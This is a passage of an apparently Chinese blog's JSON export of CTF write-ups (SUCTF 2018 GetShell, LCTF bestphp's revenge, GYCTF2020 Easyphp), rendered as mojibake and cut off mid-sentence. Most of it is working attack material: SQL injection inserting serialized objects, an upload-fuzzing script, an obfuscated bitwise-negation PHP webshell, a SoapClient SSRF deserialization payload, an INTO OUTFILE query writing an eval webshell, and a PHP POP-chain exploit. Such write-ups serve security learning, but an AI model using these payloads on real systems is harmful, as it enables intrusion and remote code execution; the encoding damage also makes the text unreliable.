å¹¶ä¸”é¢˜ç›®ä¸­å¯¹*å·åšäº†å¤„ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯¹å…¶è¿›è¡Œåå…­è¿›åˆ¶åŠ å¯†å°±è¡Œäº† 0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d ç„¶åæ„é€ sqlæ³¨å…¥è¯­å¥,æŠ“åŒ…æ”¹æ–‡ä»¶å 1','1','1','1','0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d')# INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('12','534b340ce39e1079.jpg','jpg','pic/534b340ce39e1079.jpg','a:2:{s:5:&quot;width&quot;;i:969;s:6:&quot;height&quot;;i:335;}') æˆåŠŸæ’å…¥è·å¾—flag [SUCTF 2018]GetShellif($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;])){ $data=substr($contents,5); foreach ($black_char as $b) { if (stripos($data, $b) !== false){ die(&quot;illegal char&quot;); } } } çœ‹æºç ï¼Œä»–é™¤äº†æºç çš„å‰äº”ä½ä¸æ£€æŸ¥ï¼Œå…¶ä»–éƒ½ä¼šå’Œé»‘åå•æ¯”å¯¹ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“è¿‡æ»¤äº†å•¥ï¼Œæ‰€ä»¥éœ€è¦fuzzä¸€ä¸‹,é¡ºä¾¿å­¦ä¹ ä¸€ä¸‹å¦‚ä½•ç¼–å†™æ–‡ä»¶ä¸Šä¼ çš„è„šæœ¬ import requestsurl =r&quot;http://c86c138f-b79c-45a8-9f85-6841c06aafcc.node4.buuoj.cn/index.php?act=upload&quot;s=requests.session()headers = s.get(url).headersdef upload_post(url): str_list=[] for i in range(33,127): str_list.append(chr(i)) for str in str_list: file_post=f&quot;&quot;&quot; -----------------------------380760932532682480232707439734Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;å±å¹•æˆªå›¾(3).png&quot;Content-Type: image/png12345{str}-----------------------------380760932532682480232707439734Content-Disposition: form-data; name=&quot;submit&quot;æäº¤-----------------------------380760932532682480232707439734-- &quot;&quot;&quot; r=s.post(url,headers=headers,data=file_post.encode('UTF-8')) print(r.text) if 'Stored' in r.text: print(&quot;è¯¥å­—ç¬¦å¯ä»¥é€šè¿‡: {0}&quot;.format(str)) else: print(&quot;è¿‡æ»¤å­—ç¬¦: {0}&quot;.format(str))if __name__ == '__main__': upload_post(url) ç»è¿‡æµ‹è¯•å¯ä»¥é€šè¿‡çš„å­—ç¬¦æœ‰ï¼š$ã€(ã€)ã€.ã€;ã€=ã€[ã€]ã€_ã€~ï¼Œç„¶åå°±æ˜¯æ±‰å­—äº†æ¥ä¸‹é‡Œçš„æ€è·¯å°±æ˜¯æ€è€ƒä¸€ä¸‹å¦‚ä½•æ„é€ é©¬å»è¿›è¡Œä¸Šä¼ ï¼Œå¦‚ä½•é€šè¿‡ç°æœ‰å­—ç¬¦æ„é€ å‡ºè¢«è¿‡æ»¤çš„å­—ç¬¦ï¼Œç”¨å¾—ä¸€èˆ¬å°±æ˜¯å¼‚æˆ–æ“ä½œæˆ–è€…å–åï¼Œä½†æ˜¯å¼‚æˆ–ç¬¦å·è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç”¨å–åå»æ„é€  &lt;?php$__ = [];$_ = ($__ == $__);//$_ = 1$__ = ~(è);$___ = $__[$_];print($___);//è¾“å‡ºa é€šè¿‡ä»¥ä¸Šæ–¹æ³•æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºæˆ‘ä»¬éœ€è¦çš„å­—æ¯ï¼Œæ¥ä¸‹æ¥å†™ä¸€ä¸ªfuzzè„šæœ¬ï¼š &lt;?phperror_reporting(0);header('Content-Type: text/html;charset=utf-8');function str_split_unicode($str,$l=0){ if($l&gt;0){ $ret=array(); $len=mb_strlen($str,'UTF-8');//mb_strlenè·å–é•¿åº¦ for ($i = 0; $i &lt; $len; $i += $l) { $ret[] = mb_substr($str, $i, $l, &quot;UTF-8&quot;); } return $ret; } return preg_split(&quot;//u&quot;, $str, -1, PREG_SPLIT_NO_EMPTY);//preg_split â€” é€šè¿‡ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åˆ†éš”å­—ç¬¦ä¸²ï¼Œè¿”å›æ±‰å­—}$s = 'æ”¾ä½ çš„æ±‰å­—è¦å¤šä¸€ç‚¹æ‰è¡Œ';$arr_str=str_split_unicode($s);for ($i=0; $i &lt; strlen($s) ; $i++) { echo $arr_str[$i].' ------- '.~$arr_str[$i][1].'&lt;br&gt;';} æ¥ä¸‹æ¥æ„é€ é©¬ï¼š &lt;?=$_=[];$__.=$_;$____=$_==$_;$___=~èŒ‰[$____];$___.=~å†…[$____];$___.=~èŒ‰[$____];$___.=~è‹[$____];$___.=~çš„[$____];$___.=~å’©[$____];$_____=_;$_____.=~è¯¾[$____];$_____.=~å°¬[$____];$_____.=~ç¬”[$____];$_____.=~ç«¯[$____];$__________=$$_____;$___($__________[~ç[$____]]); POST:a=env ç„¶åè®¿é—®ç¯å¢ƒå˜é‡å°±å¯ä»¥çœ‹åˆ°flagäº†ï¼Œä¸ºå•¥æ˜¯ç¯å¢ƒå˜é‡=-=ï¼Œå¥½åƒæ˜¯é¢˜ç›®å‡ºäº†é—®é¢˜ï¼Œæœ¬æ¥åœ¨æ ¹ç›®å½•çš„ï¼Œ","link":"/2021/07/22/buu22/"},{"title":"lctf babyphp&#39;s revenge","text":"phpä¸­sessionååºåˆ—åŒ–æœºåˆ¶ç®€ä»‹sessionä¸­æœ‰å…³åºåˆ—åŒ–é…ç½®ï¼š session.serialize_handler=php è¡¨æ˜sessionçš„é»˜è®¤åºåˆ—è¯å¼•æ“ä½¿ç”¨çš„æ˜¯phpåºåˆ—è¯å¼•æ“ session.serialize_handleræ˜¯ç”¨æ¥è®¾ç½®sessionçš„åºåˆ—è¯å¼•æ“çš„ï¼Œé™¤äº†é»˜è®¤çš„PHPå¼•æ“ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–å¼•æ“ï¼Œä¸åŒçš„å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚ php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ ä¾‹ï¼š \u0004names:6:&quot;spoock&quot;; name|s:6:&quot;spoock&quot;;å…¶ä¸­nameæ˜¯é”®å€¼ï¼Œs:6:â€spoockâ€æ˜¯ååºåˆ—åŒ–çš„ç»“æœ php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼ä¾‹ï¼ša:1:{s:4:&quot;name&quot;;s:6:&quot;spoock&quot;}å¯¹ä¸€æ•´ä¸ªname=spoockè¿›è¡Œåºåˆ—åŒ–å­˜å‚¨ php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ ä¾‹ï¼š name|s:6:&quot;spoock&quot;;å…¶ä¸­nameæ˜¯é”®å€¼ï¼Œs:6:â€spoockâ€æ˜¯ååºåˆ—åŒ–çš„ç»“æœ åœ¨PHPä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯PHPå¼•æ“ï¼Œå¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œåªéœ€è¦æ·»åŠ ä»£ç ini_set('session.serialize_handler', 'éœ€è¦è®¾ç½®çš„å¼•æ“');ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š &lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();// do something å­˜å‚¨æœºåˆ¶phpä¸­çš„sessionå†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚ sessionååºåˆ—åŒ–åˆ©ç”¨sessionåºåˆ—åŒ–çš„å±å®³ä¸»è¦æ¥è‡ªäºä¸åŒå­˜å‚¨å¼•æ“çš„è§£æå­˜å‚¨æ–¹æ³•ä¸åŒï¼Œå¦‚æœå¯¹åŒä¸€ç»„è¾“å…¥å€¼è¿›è¡Œä¸åŒçš„è§£ææ–¹å¼ï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿé£é™©ã€‚ä¾‹: $_SESSION['ryat'] = '|O:11:&quot;PeopleClass&quot;:0:{}'; ä¸Šè¿°sessionä½¿ç”¨çš„æ˜¯php_serializeï¼Œæ‰€ä»¥æœ€åçš„å­˜å‚¨å†…å®¹æ˜¯ a:1:{s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:{}&quot;;} ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨è¯»å–çš„è¿‡ç¨‹ä¸­é€‰æ‹©PHPï¼Œé‚£ä¹ˆå°±ä¼šå˜æˆ array (size=1) 'a:1:{s:6:&quot;spoock&quot;;s:24:&quot;' =&gt; object(__PHP_Incomplete_Class)[1] public '__PHP_Incomplete_Class_Name' =&gt; string 'PeopleClass' (length=11) ä¹Ÿå°±æ˜¯PeopClassè¿™ä¸ªç±»ä¹Ÿä¼šåœ¨ååºåˆ—åŒ–è¯»å–ä¸­è¢«æ‰§è¡Œè¿™æ˜¯å› ä¸ºå½“ä½¿ç”¨phpå¼•æ“çš„æ—¶å€™ï¼Œphpå¼•æ“ä¼šä»¥**|**ä½œä¸ºä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦ï¼Œé‚£ä¹ˆå°±ä¼šå°†a:1:{s:6:&quot;spoock&quot;;s:24:&quot;ä½œä¸ºSESSIONçš„keyï¼Œå°†O:11:&quot;PeopleClass&quot;:0:{}ä½œä¸ºvalueï¼Œç„¶åè¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åå°±ä¼šå¾—åˆ°PeopleClasè¿™ä¸ªç±»ã€‚è¿™ç§ç”±äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰€ä½¿ç”¨çš„ä¸ä¸€æ ·çš„å¼•æ“å°±æ˜¯é€ æˆPHP Sessionåºåˆ—è¯æ¼æ´çš„åŸå› ã€‚ lctf-bestphpâ€™s revengeSOAPç®€ä»‹SOAPï¼ˆSimple Object Access Protocolï¼‰æ˜¯ä¸€ç§åœ¨ web service é€šä¿¡æ—¶æ‰€ç”¨çš„åŸºäº xml çš„åè®®ã€‚å¯ä»¥ç”¨æ¥ä¿®æ”¹æŠ¥æ–‡ï¼Œä»¥åŠä¿®æ”¹è®¿é—®çš„ç›®æ ‡çš„iphttps://wooyun.js.org/drops/Trying%20to%20hack%20Redis%20via%20HTTP%20requests.html çœ‹é¢˜ç›®ï¼šflag.php only localhost can get flag!session_start();echo 'only localhost can get flag!';$flag = 'LCTF{*************************}';if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){ $_SESSION['flag'] = $flag; }only localhost can get flag! ä»–éœ€è¦loalhostè®¿é—®ï¼Œé‚£åŸºæœ¬æ˜¯SSRFçš„é¢˜ç›®äº†ï¼Œæ¥ä¸‹æ¥å°±å¯»æ‰¾ä¸€ä¸‹å¦‚ä½•çªç ´: &lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET['f'], $_POST);session_start();if (isset($_GET['name'])) { $_SESSION['name'] = $_GET['name'];}var_dump($_SESSION);$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');call_user_func($b, $a);?&gt; array(0) {} æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œè¾“å‡ºçš„å”¯ä¸€å†…å®¹æ˜¯sessionï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä»sessionè¿›è¡Œå…¥æ‰‹ã€‚sessioné€šè¿‡ä¿®æ”¹å­˜å‚¨æœºåˆ¶å¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼šè€Œsessionæ­£å¥½æœ‰å¯ä»¥ä¿®æ”¹é…ç½®æ–‡ä»¶çš„å‡½æ•°session_start()egï¼š &lt;?php// è®¾ç½® cookie çš„æœ‰æ•ˆæ—¶é—´ä¸º 1 å¤©session_start([ 'cookie_lifetime' =&gt; 86400,]);?&gt; é€šè¿‡è°ƒç”¨soapclientç±»å°±å¯ä»¥å®ç°ä¿®æ”¹è®¿é—®çš„ipäº†soapclientå†…ç½®ç±»çš„å¼€å¯éœ€è¦åœ¨php.iniä¸­è¿›è¡Œé…ç½® æ¥ä¸‹æ¥å°±æ˜¯æ„é€ payloadï¼Œå…ˆé€šè¿‡ä¸€ä¸ªç®€å•çš„å®ä¾‹ï¼Œé€šè¿‡æ„é€ è¿™æ ·çš„ä¸€ä¸ªç±»ï¼Œå¯ä»¥å®ç°å‘é€åˆ°æœåŠ¡ç«¯åœ°å€çš„æ”¹å˜ï¼šè¿™æ˜¯phpæ‰‹å†Œä¸­å…³äºsoapclientç±»çš„constructæ„é€ çš„å®šä¹‰https://www.php.net/manual/zh/soapclient.construct.php å¦‚æœåœ¨ WSDL æ¨¡å¼ä¸‹å·¥ä½œï¼Œåˆ™æ­¤å‚æ•°æ˜¯å¯é€‰çš„ã€‚å¦‚æœåœ¨é WSDL æ¨¡å¼ä¸‹å·¥ä½œï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œ urié€‰é¡¹ï¼Œå…¶ä¸­location æ˜¯å°†è¯·æ±‚å‘é€åˆ°çš„ SOAP æœåŠ¡å™¨çš„ URL,æ˜¯ SOAP æœåŠ¡uri çš„ç›®æ ‡åç§°ç©ºé—´ã€‚ &lt;?php$a=new SoapClient(null,array('location'=&gt;&quot;http://127.0.0.1/flag.php&quot;,&quot;uri&quot;=&gt;&quot;http://127.0.0.1/&quot;,'user_agent' =&gt; &quot;a:c\\r\\n&quot; .&quot;Cookie:PHPSESSID=1&quot;,));//è¿™ä¸ªuriæ²¡æœ‰å¼ºåˆ¶æŒ‡å®šï¼Œæ‰€ä»¥éƒ½å¯ä»¥echo(urlencode(serialize($a))); å¥½çš„åŸºæœ¬ä¿¡æ¯å¤§æ¦‚éƒ½æ¸…æ¥šäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•åˆ©ç”¨é¢˜ç›®ä¸­çš„å‡½æ•°å®ç°ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆç”¨php_serializeå­˜å‚¨æœºåˆ¶å­˜å…¥SoapClientï¼Œé¦–å…ˆæ„é€ ä¸€ä¸‹æˆ‘ä»¬éœ€è¦ååºåˆ—åŒ–çš„soapç±»ï¼Œ &lt;?php$a=new SoapClient(null,array('location'=&gt;&quot;http://127.0.0.1/flag.php&quot;,&quot;uri&quot;=&gt;&quot;http://test-uri/&quot;,&quot;Cookie:PHPSESSID=i9n0hbcqn1vmhnpdnterckj8h0&quot;))//è¿™ä¸ªuriæ²¡æœ‰å¼ºåˆ¶æŒ‡å®šï¼Œæ‰€ä»¥éƒ½å¯ä»¥,PHPsessidéœ€è¦è®¾ç½®ä¸ç„¶è®¿é—®ä¸åˆ°echo urlencode(serialize($a)); call_user_func()æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨,å…¶ä»–å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•° æˆåŠŸå†™å…¥ æ¥ä¸‹é‡Œè¿›è¡Œæ”¹å†…å®¹çš„ååºåˆ—åŒ–è°ƒç”¨ï¼Œç”±äºsoapçš„ssrfæ˜¯éœ€è¦è°ƒç”¨_callæ–¹æ³•çš„ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¦æƒ³æƒ³å¦‚ä½•è°ƒç”¨ä»€ä¹ˆä¸å­˜åœ¨çš„ç±»å’Œæ–¹æ³•=-=ï¼Œå¯æƒ³è€ŒçŸ¥ å°±æ˜¯è¿™é‡Œçš„welcome_toâ€¦..ï¼Œå…·ä½“çš„è¿ä½œé€»è¾‘å¦‚ä¸‹ å‡ ä¸ªå‡½æ•°è¡¥å……äº†è§£ä¸€ä¸‹ï¼š é¢˜ç›®ä¸­æ¥ä¸‹æ¥çš„ä»£ç è¿ä½œæ˜¯ï¼šé¦–å…ˆresetå°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå•å…ƒä¹Ÿå°±æ˜¯SoapClientï¼Œç„¶åå°†welcome_..ä¹Ÿåˆå¹¶åœ¨è¿™ä¸ªæ•°ç»„å½“ä¸­ æœ€åå†ä½¿ç”¨implodeå°†è¿™ä¸ªæ•°ç»„è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œä½†å…¶ä¸­éƒ½æ²¡æœ‰è§¦å‘è¿‡è¿™ä¸ªsoapçš„__callæ–¹æ³•è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†å˜é‡bè¦†ç›–ä¸ºcall_user_func,ä»¤å…¶åœ¨æœ€åè°ƒç”¨æ‰§è¡ŒSoapClientï¼Œä½†æ˜¯ä¼ å…¥çš„bä¼šè¢«å†™å…¥ä¸ºæ•°ç»„å½¢å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªå‡½æ•°å°†å…¶é‡Šæ”¾å‡ºæ¥ï¼Œå°±æ˜¯extract()å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å°†æ•°ç»„å±•å¼€ï¼Œé”®åä½œä¸ºå˜é‡åï¼Œå…ƒç´ å€¼ä¸ºå˜é‡å€¼ æ‰€ä»¥payloadå¦‚ä¸‹: è®¿é—®session=1ï¼ˆåˆšåˆšè®¾ç½®çš„ï¼‰ å°ç»“ï¼š1.sessionååºåˆ—åŒ–æœºåˆ¶ä¸»è¦æ˜¯åˆ©ç”¨sessionå­˜å‚¨æœºåˆ¶ä¸åŒæ‰€é€ æˆçš„çš„æ¼æ´2.åˆ¤åˆ«æ ‡å‡†æ˜¯ï¼šsessionæ˜¯å¦å¼€å¯ï¼Œsession_startå‡½æ•°æ˜¯å¦å¯ä»¥è¢«è°ƒç”¨ï¼Œæ˜¯å¦å­˜åœ¨å¤šä½™å‚æ•°å¯ä»¥ç”¨æ¥æ§åˆ¶session_handlerã€‚3.å¯ä»¥åˆ©ç”¨soapå†…ç½®ç±»å®ç°ssrf 1'ununionion selselectect '&lt;?php eval($_POST[a]);?&gt;' INintoTO OUToutfileFILE '/var/www/html/1.php'#","link":"/2021/07/20/lctf-babyphp-s-revenge/"},{"title":"GYCTF2020-Easyphp","text":"[GYCTF2020]Easyphpwww.zipå¤‡ä»½æ–‡ä»¶ä¸‹è½½ä¸‹æ¥å®¡è®¡ä¸€ä¸‹~æœ‰ç‚¹å¥½ç¬‘å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ~ åœ¨lib.phpä¸­çœ‹åˆ°å¾ˆå¤šç±»å’Œæ–¹æ³•ï¼Œç›²çŒœå°±æ˜¯éœ€è¦ååºåˆ—åŒ–ï¼Œç„¶åæœç´¢äº†ä¸€ä¸‹unserializeå‡½æ•°å‘ç°åœ¨updateå‡½æ•°ä¸­æœç„¶æœ‰è¿™ä¸ªå‡½æ•°ã€‚ä½†æ˜¯æ²¡çœ‹åˆ°ä¼ å‚çš„å…¥å£ï¼Œäºæ˜¯å†çœ‹çœ‹å…¶ä»–æ–‡ä»¶ï¼Œå‘ç°ï¼šåŒ…å«äº†flag.phpï¼Œå›æƒ³åˆ°åˆšåˆšçœ‹åˆ°çš„file_get_contents~è¿™ä¸å°±å‘¼åº”ä¸Šäº†ï¼Ÿä¸è¿‡è¿˜æ˜¯è¦å†ç»§ç»­çœ‹çœ‹ï¼Œåˆ«ç­‰ä¸‹èµ°äº†æ­ªè·¯ã€‚ã€‚ã€‚ å›åˆ°update.phpä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå³ä½¿login!=1ä¾æ—§ä¼šæ‰§è¡Œ$users-&gt;update();ï¼Œè€Œè¿™ä¸ªå‡½æ•°åœ¨lib.phpä¸­ï¼Œååºåˆ—åŒ–äº†getNewinfo()ä¸­çš„å†…å®¹ç»§ç»­çœ‹getNewInfo()é‡Œé¢çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨postä¼ å…¥ageå’Œnicknameï¼Œå®ç°å‚æ•°çš„ä¼ å…¥ä½†æ˜¯ç”±äºæœ‰ä¸ªsafeå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥é€šè¿‡file_get_contentsåŒ…å«æ˜¯ä¸å¤ªå¯èƒ½çš„==äºæ˜¯æƒ³æƒ³æœ‰æ²¡æœ‰å…¶ä»–ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªsafeå‡½æ•°ï¼Œä»–æ˜¯é€šè¿‡å°†å±é™©å­—ç¬¦ä¸²æ¢æˆhackeræ¥è¾¾åˆ°è¿‡æ»¤çš„ç›®çš„ï¼Œè¿™æ ·çš„è¯å°±æ„å‘³ç€å­˜åœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸çš„çš„é£é™©ç»§ç»­æŸ¥çœ‹ä¸€ä¸‹ä»–çš„æ•´ä½“ä»£ç é€»è¾‘ï¼Œä¸éš¾å‘ç°nicknameå’Œageä¼šè¢«æ’å…¥åœ¨è¿™é‡Œæ‰§è¡Œupdateæ“ä½œï¼šæˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡åº”è¯¥æ˜¯ä¿®æ”¹adminçš„å¯†ç ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç™»å½•ï¼Œæ‰€ä»¥è¿™é‡Œçš„updateè¯­å¥ä¼¼ä¹ä¹Ÿæ²¡æœ‰å¤šå¤§æ„ä¹‰çš„äºšå­ï¼Œäºæ˜¯æˆ‘ä»¬çœ‹çœ‹å…¶ä»–åœ°æ–¹èƒ½ä¸èƒ½æ„é€ å‡ºä¸€æ¡é“¾å‡ºæ¥,å¦‚æœæˆ‘ä»¬å¯ä»¥æ˜¯ç”¨loginæ–¹æ³•ï¼Œå®ƒä¼šåˆ›é€ ä¸€ä¸ªæ–°çš„ç±»ä¹Ÿå°±æ˜¯dbCtrlï¼Œæ¥ä¸‹æ¥å°±ä¼šæ‰§è¡ŒæŸ¥è¯¢çš„sqlè¯­å¥ï¼Œä½†æ˜¯æŸ¥è¯¢ç»“æœä¼¼ä¹æ˜¯åªæœ‰å›æ˜¾idï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯å¯†ç ï¼Œæ‰€ä»¥å¥½åƒæ„ä¹‰ä¸å¤ªå¤§ï¼Ÿï¼Œç»§ç»­å¾€ä¸‹çœ‹çœ‹ åœ¨useré‡Œé¢è¿˜æœ‰ä¸€ä¸ªtostringï¼Œé€šå¸¸æ˜¯ç”¨æ¥åšè·³æ¿çš„ï¼šå½“ä¸€ä¸ªç±»è¢«è½¬æ¢æˆå­—ç¬¦ä¸²æ—¶è¢«è°ƒç”¨ï¼Œupdateå‡½æ•°ä¹Ÿæ˜¯Useré‡Œé¢çš„ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯å…¶ä»–åœ°æ–¹çš„è·³å›æ¥è¿™é‡Œå§ï¼Œç»§ç»­å¾€ä¸‹ è¿™æ˜¯ä¸€ä¸ªæ–°çš„ç±»ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªcallæ–¹æ³•ï¼Œå³è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨ï¼Œä¸€èˆ¬ä¹Ÿæ˜¯ç”¨æ¥åšè·³æ¿çš„ï¼Œä»–æœ€åæ˜¯loginçš„ï¼Œloginå°±ä¸¤ä¸ªåœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯dbCtrlï¼Œä¸€ä¸ªæ˜¯Userï¼Œè¦å»å“ªä¸ªå‘¢ï¼Ÿï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯è¦å»dbCtrlï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œç»§ç»­å¾€ä¸‹çœ‹çœ‹ è¿™è¾¹echoäº†sqlï¼Œåº”è¯¥æ˜¯echoæŸ¥è¯¢ç»“æœå§ï¼Œechoè¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ä»è¿™é‡Œå¼€å§‹èµ·è·³åˆ°Useré‡Œé¢ï¼Œ æ•´ç†ä¸€ä¸‹æ€è·¯ï¼Œä»UpdateHelperä¸­æ„é€ æŸ¥è¯¢sqlè¯­å¥ç„¶åé€šè¿‡destructå°†nicknameèµ‹å€¼ä¸ºInfoç±»ï¼Œè°ƒç”¨infoé‡Œé¢çš„callæ–¹æ³•ï¼Œå¹¶å°†ctrlcaseèµ‹å€¼ä¸ºdbCtrlä½¿å…¶ä½¿ç”¨loginæ–¹æ³•æŸ¥è¯¢sqlç»“æœï¼Œ æ„é€ ä¸€ä¸‹åœ¨æœ¬åœ°è°ƒè¯•ä¸€æ³¢çœ‹çœ‹ &lt;?phperror_reporting(0);session_start();function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',&quot;'&quot;,'\\\\',&quot;*&quot;,&quot;alter&quot;); return str_replace($array,'hacker',$parm);}class User{ public $id; public $age=null; public $nickname=null; public function login() { } public function update(){ } public function getNewInfo(){ } public function __destruct(){ } public function __toString() { $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; }}class Info{ public $CtrlCase; public function __construct(){ } public function __call($name,$argument){ echo $this-&gt;CtrlCase-&gt;login($argument[0]); }}Class UpdateHelper{ public $sql; public function __construct(){ } public function __destruct() { echo $this-&gt;sql; }}class dbCtrl{ public $hostname=&quot;localhost&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;as119801222&quot;; public $database=&quot;security&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() { $this-&gt;name=$_POST['username']; $this-&gt;password=$_POST['password']; $this-&gt;token=$_SESSION['token']; } public function login($sql) { $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) { die(&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot; . $this-&gt;mysqli-&gt;connect_error); } $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param('s', $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token=='admin') { return $idResult; } if (!$idResult) { echo('ç”¨æˆ·ä¸å­˜åœ¨!'); return false; } if (md5($this-&gt;password)!==$passwordResult) { echo('å¯†ç é”™è¯¯ï¼'); return false; } $_SESSION['token']=$this-&gt;name; return $idResult; } public function update($sql) { //è¿˜æ²¡æ¥å¾—åŠå†™ }}$a=new UpdateHelper();$b=new User();$c=new Info();$d=new dbCtrl();$b-&gt;age=&quot;select password from users where username='admin'&quot;;$c-&gt;CtrlCase=$d;$b-&gt;nickname=$c;$a-&gt;sql=$b;echo (serialize($a));unserialize(&quot;O:12:\\&quot;UpdateHelper\\&quot;:1:{s:3:\\&quot;sql\\&quot;;O:4:\\&quot;User\\&quot;:3:{s:2:\\&quot;id\\&quot;;N;s:3:\\&quot;age\\&quot;;s:49:\\&quot;select password from users where username='admin'\\&quot;;s:8:\\&quot;nickname\\&quot;;O:4:\\&quot;Info\\&quot;:1:{s:8:\\&quot;CtrlCase\\&quot;;O:6:\\&quot;dbCtrl\\&quot;:8:{s:8:\\&quot;hostname\\&quot;;s:9:\\&quot;localhost\\&quot;;s:6:\\&quot;dbuser\\&quot;;s:4:\\&quot;root\\&quot;;s:6:\\&quot;dbpass\\&quot;;s:11:\\&quot;as119801222\\&quot;;s:8:\\&quot;database\\&quot;;s:8:\\&quot;security\\&quot;;s:4:\\&quot;name\\&quot;;N;s:8:\\&quot;password\\&quot;;N;s:6:\\&quot;mysqli\\&quot;;N;s:5:\\&quot;token\\&quot;;N;}}}}&quot;); è°ƒè¯•å®Œä»¥åæ˜¯æŒ‰ç…§æƒ³è±¡ä¸­çš„è·³äº†ï¼Œä½†æ˜¯æ²¡å‡ºæ¥å¯†ç ï¼Ÿæ‰€ä»¥æƒ³è¯´å†æ„é€ ä¸€ä¸‹è¯•è¯•çœ‹ï¼Œè¯•äº†å‡ æ¬¡éƒ½æ²¡å‡ºå¯†ç ï¼Œäºæ˜¯çœ‹äº†ä¸€ä¸‹wpï¼Œå‘ç°å‡ 